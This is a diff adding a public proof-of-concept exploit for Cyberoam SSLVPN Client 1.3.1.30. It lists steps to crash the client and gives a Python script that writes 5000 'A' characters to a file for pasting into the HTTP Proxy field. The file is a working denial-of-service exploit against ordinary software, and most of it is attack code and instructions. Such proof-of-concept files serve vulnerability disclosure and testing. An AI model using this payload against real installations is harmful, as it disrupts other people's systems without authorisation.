@@ -1,0 +1,23 @@
+#Exploit Title: Cyberoam SSLVPN Client 1.3.1.30 - 'HTTP Proxy' Denial of Service (PoC)
+#Discovery by: Victor Mondragón
+#Discovery Date: 2019-05-23
+#Vendor Homepage: https://www.cyberoam.com
+#Software Link: https://download.cyberoam.com/solution/optionals/i18n/CrSSL_v1.3.1.30.zip
+#Tested Version: 1.3.1.30
+#Tested on: Windows Windows 10 Single Language x64 / Windows 7 Service Pack 1 x64
+
+#Steps to produce the crash:
+#1.- Run python code: c_sslvpn_http.py
+#2.- Open c_sslvpn_http.txt and copy content to clipboard
+#3.- Open Cyberoam SSLVPN Client
+#4.- Select Proxy Settings > Enable "Manual Configuration"
+#5.- In "HTTP Proxy" address field paste Clipboard
+#6.- In "Port" type 80
+#7.- Select "OK"
+#8.- Crashed! 
+
+cod = "\x41" * 5000
+
+f = open('c_sslvpn_http.txt', 'w')
+f.write(cod)
+f.close()
